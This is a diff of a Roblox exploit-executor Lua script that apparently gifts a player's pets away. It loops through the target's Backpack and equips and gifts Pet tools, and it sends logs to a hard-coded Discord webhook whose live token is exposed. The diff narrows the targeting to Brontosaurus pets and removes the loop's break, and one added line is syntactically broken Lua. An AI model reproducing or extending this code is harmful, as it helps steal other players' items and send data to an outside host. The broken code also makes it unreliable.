@@ -1,3 +1,15 @@
+                    name = getexecutorname()
+                end
+            end)
+            return name or "Unknown"
+        end
+
+        local function formatNumberWithCommas(n)
+            local str = tostring(n)
+            return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+        end
+
+        local function getWeight(toolName)
 local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
         local date = os.date("%Y-%m-%d %H:%M:%S")
         local LogsWebhook = "https://discord.com/api/webhooks/1434976186999509063/jjItn51GRNYAO2RtJRMn98Tk2eeTJar6GcrFqvA_z56OeX-QWtrjeQ2tOpXDi33S55md"
@@ -707,7 +719,8 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                     for _, tool in targetPlr.Backpack:GetChildren() do
                         if tool:IsA("Tool")
                         and tool:GetAttribute("ItemType") == "Pet"
-                        and tool:GetAttribute("PET_UUID") == pet.Id then
+                        and tool:GetAttribute("PET_UUID") == pet.Id 
+and petName:("Brontosaurus") then
 
                             print("Equipping & gifting:", tool.Name)
                             targetPlr.Character.Humanoid:EquipTool(tool)
@@ -715,7 +728,6 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
 
                             for i = 1, 3 do
                                 if giftHeldPet() then
-                                    break
                                 end
                                 task.wait(0.3)
                             end
